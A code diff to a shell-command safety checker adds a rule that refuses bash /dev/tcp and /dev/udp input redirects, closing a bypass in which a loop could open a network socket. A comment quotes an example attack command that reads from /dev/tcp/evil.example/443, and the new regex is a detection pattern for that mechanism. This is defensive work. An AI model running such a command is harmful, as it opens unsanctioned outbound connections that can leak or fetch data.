@@ -195,6 +195,24 @@ const LOOP_CONTROL_RE = /^(?:break|continue)(?:\s+\d+)?$/;
 const INPUT_REDIRECT_PATH_RE = /^[A-Za-z0-9_./~-]+$/;
 
 /**
+ * bash's virtual network-socket device paths: `< /dev/tcp/host/port` and
+ * `< /dev/udp/host/port` do not open a file at all -- bash special-cases
+ * these two spellings to open a TCP/UDP socket to `host:port` instead
+ * (bash(1), "Redirecting Input and Output" / "/dev/tcp/host/port"). Every
+ * character in `/dev/tcp/evil.example/443` is inside
+ * `INPUT_REDIRECT_PATH_RE`'s allowed set, so without this check the target
+ * looked exactly as "provably a plain file path" as `/dev/null` or
+ * `data.txt` to `isPlainInputRedirectResidue`, and `while read l; do cat $l;
+ * done < /dev/tcp/evil.example/443` was treated as pure inert grammar
+ * residue and waved through -- a live outbound network connection opened by
+ * a `while`/`done` loop header this module exists to prove runs nothing
+ * (#1062 C6, CONFIRMED). `/dev/null`, `/dev/stdin`, `/dev/fd/N` and every
+ * other `/dev/...` path are unaffected: this refuses exactly the two
+ * `tcp`/`udp` device names bash special-cases, nothing else under `/dev`.
+ */
+const NETWORK_DEV_PATH_RE = /^\/dev\/(tcp|udp)\//;
+
+/**
  * One input-redirect clause inside a peeled residue: `< PATH` or `<<< WORD`
  * (a here-string). `<<<` is tried before the single-`<` alternative so a
  * here-string is never misread as a file redirect whose target happens to
@@ -229,6 +247,11 @@ const RESIDUE_REDIRECT_CLAUSE_RE = /(<<<|<)\s*(\S+)/g;
  *     regardless (that check runs before `stripShellGrammar` is ever called
  *     -- see `matchCoveredCommand`), so this function does not need to, and
  *     must not, weaken that.
+ *   - a `<` (not `<<<`) target under `/dev/tcp/` or `/dev/udp/` is refused
+ *     (#1062 C6) even though it is otherwise a syntactically plain path:
+ *     bash opens these two as a network socket, not a file -- see
+ *     `NETWORK_DEV_PATH_RE`'s doc for the mechanism. A `<<<` here-string
+ *     target is unaffected; it never opens its "target" as a path at all.
  *
  * Any gap between clauses that is not pure whitespace, or any trailing text
  * after the last clause, fails the whole residue: a redirect clause is not
@@ -244,7 +267,10 @@ function isPlainInputRedirectResidue(rest: string): boolean {
     if (rest.slice(consumed, match.index).trim() !== '') return false;
     const [whole, op, target] = match;
     if (target === undefined) return false;
-    const targetOk = op === '<<<' ? !/[$`(\s]/.test(target) : INPUT_REDIRECT_PATH_RE.test(target);
+    const targetOk =
+      op === '<<<'
+        ? !/[$`(\s]/.test(target)
+        : INPUT_REDIRECT_PATH_RE.test(target) && !NETWORK_DEV_PATH_RE.test(target);
     if (!targetOk) return false;
     consumed = match.index + whole.length;
   }
